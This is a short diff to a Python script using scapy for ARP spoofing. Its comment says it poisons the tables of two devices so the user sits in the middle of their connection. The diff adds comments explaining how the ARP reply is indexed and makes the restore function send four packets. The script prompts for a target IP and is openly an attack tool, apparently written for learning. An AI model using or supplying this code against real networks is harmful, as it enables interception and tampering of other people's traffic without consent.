@@ -10,6 +10,10 @@ def get_mac(ip):
     arp_broadcast = broadcast/arp_req
     answer_list = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
     return answer_list[0][1].hwsrc
+# mac = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0][0][1].hwsrc
+# return mac 
+# First 0 = answer list, Second 0 = The first element in the list, 1 = The response part
+# [0] -> [<[ans]>, [unans]] / [0] -> ans = [<[req, res]>, [req, res], [req, res]] / [1] -> [req, <res>]
 
 
 # This will spoof the IP tables of 2 devices resulting in you ending up in the middle of the connection.
@@ -24,7 +28,7 @@ def restore(target_ip, sender_ip):
     target_mac = get_mac(target_ip)
     sender_mac = get_mac(sender_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=sender_ip, hwsrc=sender_mac)
-    scapy.send(packet, verbose=False)
+    scapy.send(packet, count= 4, verbose=False)
 
 
 target_ip = input("Enter the target IP: ")
